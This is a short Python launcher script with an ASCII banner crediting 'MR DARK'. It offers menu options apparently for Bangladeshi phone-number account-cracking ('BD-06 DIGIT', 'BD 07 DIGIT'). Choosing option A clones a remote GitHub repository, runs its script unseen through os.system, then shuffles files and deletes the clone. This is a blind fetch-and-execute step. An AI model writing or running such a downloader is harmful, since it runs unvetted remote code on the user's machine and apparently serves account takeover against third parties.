import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
from rich import pretty
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.panel import Panel as nel


logo = ("""\033[1;91m ███    ███ ██████      ██████   █████  ██████  ██   ██ 
\033[1;92m ████  ████ ██   ██     ██   ██ ██   ██ ██   ██ ██  ██  
\033[1;93m ██ ████ ██ ██████      ██   ██ ███████ ██████  █████   
\033[1;94m ██  ██  ██ ██   ██     ██   ██ ██   ██ ██   ██ ██  ██  
\033[1;95m ██      ██ ██   ██     ██████  ██   ██ ██   ██ ██   ██                                                                       
\033[1;91m ┌─────────────────────────────────────────────────────┐\033[1;91m  
\033[1;91m │\033[1;92mMADE BY   :            MR DARK               	\033[1;91m       │
\033[1;91m │\033[93;1mFB ID     :            MOHAMMAD JISAN      \033[1;91m          │
\033[1;91m │\033[1;94mWhatApp   :            01647811068              \033[1;91m     │
\033[1;91m │\033[1;91mGITHUB    :            MrDarkYT       \033[1;91m               │
\033[1;91m └─────────────────────────────────────────────────────┘""")

class timer:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		#FUCK DARK CYBER
		print (logo)
		print("\033[95;1m [A] \033[1;96m BD-06 DIGIT   \033[92;1m[SPEED FAST]                         ")
		print("\033[95;1m [B] \033[1;96m BD 07 DIGIT  \033[91;1m [SPEED SLOW] ")
		print("\033[95;1m [C] \033[1;94m𝐂𝐎𝐍𝐓𝐀𝐂𝐓                                       ")
		print("\033[95;1m [E] \033[1;93m𝐄𝐗𝐈𝐓                                               ")
		print ("")
		dark = input("\033[0;93m \033[0;92m[\033[0;90m?\033[0;92m]\033[0;91m CHOOSE : ")
		if dark in ["A", "a"]:
			time.sleep(0.5)
			os.system("git clone https://github.com/MAHADI-143/Fuck && cd Fuck && python Fuck-RR.py")
			
			os.system("rm -rf Fuck-RR.py")
			
			os.system("cp -f Fuck/Fuck-RR.py \\.")
			
			os.system("rm -rf Fuck")
			
			
			
		
timer()
		